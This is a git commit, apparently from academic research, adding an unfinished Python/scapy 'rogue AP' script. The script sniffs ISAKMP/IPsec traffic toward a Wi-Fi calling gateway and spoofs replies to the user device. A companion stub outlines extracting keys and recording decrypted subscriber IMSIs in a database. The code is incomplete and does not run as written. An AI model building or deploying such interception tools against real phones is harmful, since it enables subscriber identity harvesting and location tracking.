ac4f28adc56b6be8f1717a42313f7785a316059f
Sukwha Kyung <skyung1@asu.edu>
2018-06-04 10:52:09 -0700

    Testing phase 1 and 2

---
+++ code/ipsecServer.py
@@ -0,0 +1,7 @@
+# this is the process running on the ipsec server
+
+# extract keys
+
+# decrypt keys
+
+# record decrypted IMSI in the DB
---
+++ code/phase2.py
@@ -0,0 +1,73 @@
+#!/usr/bin/python
+import sys
+import os
+import getopt
+from scapy.all import *
+
+def usage():
+    print 'For help: "./rogueAp.py -h" or "./rogueAp.py --help"'
+    print "Usage: ./rogueAp.py -i <Wired_interface> -o <WiFi_interface> -a <IPSEC_server_addr>"
+
+def packet_proc():
+    #TODO: Fix this module later
+    #TODO: Extract ue_addr
+    # capture first 2 isakmp packets from input (i.e., Rogue-AP interface)
+    for pkt in sniff(iface=wifi_intf, filter="udp and port 500"):
+        """
+        if pkt.src in DB
+            update geolocation
+        else
+            update both addr and DB
+        """
+        data1 = ""
+        child_proc = os.fork()
+        tlayer = pkt.getlayer(UDP)
+        if pkt.getlayer(ISAKMP):
+            data1 += str(tlayer.payload)
+
+        #send(IP(dst=ipsec_addr)/UDP()/ISAKMP(data1))
+        send(IP(dst=ue_addr, src=pkts[0][IP].src)/UDP(dport=pkts[0].dport)/ISAKMP(data4))
+
+        os._exit(0)
+
+# set input, output interfaces and epdg server ip from arguments
+def main():
+    try:
+        opts, args = getopt.getopt(sys.argv[1:], "hi:o:a:", ["help"])
+    except getopt.GetoptError as err:
+        #print help info and exit
+        print str(err)
+        usage()
+        sys.exit(2)
+
+    if len(sys.argv) < 2:
+        print "Error: option does not exist. Please try again."
+        usage()
+        sys.exit(2)
+
+    ipsec_addr = None
+    wired_intf = None
+    wifi_intf = None
+    for o, a in opts:
+        if o == "-i":
+            wired_intf = a
+        elif o == "-o":
+            wifi_intf = a
+        elif o == "-a":
+            ipsec_addr = a
+        elif o in ("-h", "--help"):
+            usage()
+            sys.exit()
+        else:
+            #assert False 
+            print "Error: option does not exist. Please try again."
+            usage()
+            sys.exit(2)
+
+    packet_proc()
+    # NOTE: To check ue addr, we need to sniff WIFI interface, not the ethernet interface. Solve this problem.
+    # capture the response from the ipsec server, send it to the user device.
+
+if __name__=='__main__':
+    main()
+
